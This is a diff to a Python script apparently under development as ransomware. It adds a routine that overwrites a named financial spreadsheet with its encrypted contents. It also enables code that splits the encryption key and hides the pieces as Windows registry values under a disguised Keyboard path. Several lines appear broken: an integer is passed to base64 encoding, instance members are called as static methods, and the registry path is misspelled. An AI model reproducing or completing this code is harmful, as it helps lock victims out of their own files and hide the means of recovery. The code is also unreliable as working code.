@@ -2,9 +2,11 @@ from cryptography.fernet import Fernet
 import winreg
 import base64
 
+
 class hideKey():
 
     def __init__(self, adj_key: list):
+
         self.adj_key = adj_key
         self.REG_PATH = r'Conrol Panel\Keyboard'
         self.run()
@@ -34,13 +36,30 @@ class hideKey():
 
         for num in range(5):
 
-            print(base64.b64encode(num))
-            print(self.adj_key[num])
-            # hideKey.set_reg(
-            #     name=base64.b64encode(num),
-            #     value=self.adj_key[num],
-            #     REG_PATH=self.REG_PATH,
-            # )
+            hideKey.set_reg(
+                name=base64.b64encode(num),
+                value=self.adj_key[num],
+                REG_PATH=self.REG_PATH,
+            )
+
+
+class encryptFile():
+
+    def __init__(self, filename: str, key: str):
+        self.filename = filename
+        self.__key = key
+
+    def run(self):
+
+        self.__fernet_class = Fernet(self.__key)
+
+        with open(self.filename, "rb") as file:
+            data = file.read()
+            enc_d = self.__fernet_class.encrypt(data)
+
+        with open(self.filename, "wb") as file:
+            file.write(enc_d)
+
 
 class keyGenerator():
 
@@ -62,12 +81,24 @@ class keyGenerator():
         chars = int(lenght/n)
 
         if (lenght % n != 0):
-            print("Sorry this string cannot be diveded into" + str(n) + " equal parts.")
+            print("Sorry this string cannot"
+                  "diveded into" +
+                  str(n) +
+                  " equal parts.")
         else:
-            for i in range(0,lenght, chars):
+            for i in range(0, lenght, chars):
                 _adj_key.append(key[i:i+chars])
 
         return _adj_key
 
-print(hideKey(adj_key=keyGenerator().adj_key).run())
-print()
+
+if __name__ == "__main__":
+
+    encryptFile(
+        filename="pers_fin_accounting.xlsx",
+        key=keyGenerator.gen_key()
+    ).run()
+
+    hideKey(
+        adj_key=keyGenerator.adj_key()
+    ).run()
